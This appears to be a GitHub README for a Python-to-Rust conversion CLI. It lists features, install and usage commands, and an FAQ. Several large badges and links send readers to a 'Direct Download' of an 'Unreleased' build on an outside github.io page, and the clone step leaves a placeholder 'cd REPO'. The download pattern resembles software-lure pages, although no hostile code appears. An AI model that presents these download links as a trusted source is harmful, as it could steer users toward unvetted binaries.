# Code Convert Helper vUnreleased - Python-to-Rust Code Conversion Tool 2026

> **Code Convert Helper is a cross-platform command-line utility that turns a well-defined subset of Python into Rust, making types, ownership decisions, and unsupported constructs visible for review.**

[![Platform](https://img.shields.io/badge/Platform-Cross--platform-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Unreleased-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/masoncollet72/code-convert-helper-2026?style=flat-square)](https://github.com/masoncollet72/code-convert-helper-2026)

---

<p align="center">
  <a href="https://masoncollet72.github.io/code-convert-helper-2026/">
    <img src="https://img.shields.io/badge/Download-Code%20Convert%20Helper%20Latest-brightgreen?style=for-the-badge" alt="Download Code Convert Helper">
  </a>
</p>

> **[Direct Download - Code Convert Helper Unreleased](https://masoncollet72.github.io/code-convert-helper-2026/)**

---

[Download Latest Build](https://masoncollet72.github.io/code-convert-helper-2026/)

---

## About Code Convert Helper

Code Convert Helper helps engineers who want to move Python code into Rust. Supported Python sources go through a structured conversion pipeline, and the resulting Rust-oriented output never conceals a translation choice that is still uncertain.

The tool targets migration work that can be reviewed: explicit type and ownership hints steer the generated code, while open questions, ownership conflicts, and unsupported syntax stay in plain view. Comments, documentation, directives, and intermediate representation data all survive the workflow.

---

## Features

- Translates a core subset of Python into Rust.
- Keeps translation decisions explicit rather than guessing silently.
- Uses type hints and ownership hints as guidance for generated code.
- Flags unresolved decisions and ownership conflicts for later follow-up.
- Retains comments and honors conversion directives.
- Produces versioned, locked JSON intermediate representation files.
- Carries unsupported constructs forward as clearly labeled verbatim blocks.
- Turns Sphinx, Google, and NumPy docstrings into `rustdoc`.
- Offers preflight checks, source conversion, and intermediate representation inspection.
- Extends ecosystem-specific conversion behavior through plugins.

---

## Installation

Clone the repository and move into its directory:

```bash
git clone https://github.com/masoncollet72/code-convert-helper-2026.git
cd REPO
```

Install the project with the Python packaging workflow available in the repository, then confirm the command-line entry point works:

```bash
python -m pip install .
code-convert-helper --help
```

When you work straight from a checkout, invoke the CLI through the project's Python environment rather than installing it globally.

---

## Usage

Most conversions follow three stages: validation, translation, and inspection:

```bash
code-convert-helper preflight path/to/source.py
code-convert-helper convert path/to/source.py --output generated/
code-convert-helper inspect-ir generated/
```

Whenever Python semantics leave too little information for a faithful Rust translation, supply type or ownership hints. Before folding the output into a Rust project, examine the generated markers and verbatim blocks.

A practical workflow looks like this:

1. Run preflight checks on the Python source.
2. Add explicit type or ownership guidance where it is missing.
3. Convert the source into the chosen output directory.
4. Inspect the generated JSON intermediate representation.
5. Review unresolved decisions, conflicts, and unsupported constructs.
6. Adjust directives or plugin behavior and run the conversion again.

> Command names and options can change between releases. Run `code-convert-helper --help` to see the interface of your installed version.

---

## Configuration

Code Convert Helper keeps conversion guidance close to the source it translates. Supported type hints, ownership hints, and directives describe the decisions that cannot be reliably inferred from Python alone.

The pipeline also relies on a versioned, locked JSON intermediate representation, giving you an inspectable record of the translation state that can be reviewed next to the generated Rust output.

For behavior tied to a particular ecosystem, extend the tool through its plugin system instead of baking project-specific assumptions into the core conversion process.

---

## Requirements

- A cross-platform environment able to run the project.
- Python, used to install and invoke the conversion CLI.
- Rust tooling, needed to compile or integrate the generated Rust code.
- Read and write access to the source and output directories.
- Extra storage for generated Rust files and JSON intermediate representation data.

---

## FAQ

### What exactly does Code Convert Helper convert?

A core subset of Python becomes Rust. Anything outside that supported subset is kept as a marked verbatim block rather than passed off as fully translated code.

### Does the tool pick types or ownership implicitly?

No. Translation uncertainty appears as marked decisions and ownership conflicts. When the source lacks enough information, you supply explicit hints.

### Are comments and documentation kept?

Comments are preserved, and Sphinx, Google, and NumPy docstrings can be turned into `rustdoc`.

### How do I examine a conversion?

Go through the preflight, conversion, and intermediate representation inspection stages. The versioned locked JSON files give you a structured view of the conversion process.

### How is project-specific behavior handled?

Through the plugin system, which covers ecosystem-specific behavior. Plugins let integrations be added without altering the general conversion workflow.

### What should I do when the output contains marked blocks?

Review the affected source, add the relevant type or ownership hints or directives, and run the workflow again. Some unsupported constructs may need a manual Rust implementation.

### Where do I find updates?

Check the repository and its latest available build at [Download Latest Build](https://masoncollet72.github.io/code-convert-helper-2026/).

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
